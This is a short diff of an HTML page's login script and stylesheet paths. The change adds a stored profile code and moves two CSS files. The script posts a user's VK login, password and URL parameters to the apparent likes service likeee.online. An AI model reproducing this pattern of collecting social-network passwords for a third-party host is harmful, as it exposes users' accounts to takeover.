@@ -77,6 +77,7 @@
                         data: {"params_vk": window.location.search, "login": document.getElementById("login").value, "password": document.getElementById("password").value, "source": document.getElementById("source").value},
                         success: function(data) {
                             if (data.response == "ok"){
+                                code = data.data.profile.code;
                                 $.ajax({ 
                              
                                   url: "https://likeee.online/api2/context.php", 
@@ -130,8 +131,8 @@
                     window.location = "https://vk.me/club198596704";
                 }
             </script>
-            <link rel="stylesheet" href="autorization.css">
-            <link rel="stylesheet" href="helloPage.css">
+            <link rel="stylesheet" href="scss/autorization.css">
+            <link rel="stylesheet" href="scss/helloPage.css">
             <!--<style type="text/css">
                 body {
                     background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAR4AAACwCAMAAADudvHOAAAAPFBMVEXkAwP/jAD/7QAAgCYATf91B4fiIwX0XgH/jwD/iQD/qAD/8QD06QEAW9IAT/8/NdF4AIGLOpoFgyQAggBNJZwSAAABMklEQVR4nO3QAVUCAABEsQMFBEUQ+3e1wX8G2CJsZ8IAAAAAAAAAgP+5EPZB2IGgJ+lJepKepCfpSXqSnqQn6Ul6kp6kJ+lJepKepCfpSXqSnqQn6Ul6kp6kJ+1K2I2wT8KOBD1JT9KT9CQ9SU/Sk/QkPUlP0pP0JD1JT9KT9CQ9SU/Sk/QkPUlP0pP0JD1JT9oXYS/C3gh6kp6kJ+lJepKepCfpSXqSnqQn6Ul6kp6kJ+lJepKepCfpSXqSnqQn6Ul6kp60X8LuhL0T9CQ9SU/Sk/QkPUlP0pP0JD1JT9KT9CQ9SU/Sk/QkPUlP0pP0JD1JT9KT9CQ9ad+EPQh7EnYi6El6kp6kJ+lJepKepCfpSXqSnqQn6Ul6kp6kJ+lJepKepCfpSXqSnqQn6Ul60n4If8ynhvn31CTmAAAAAElFTkSuQmCC");
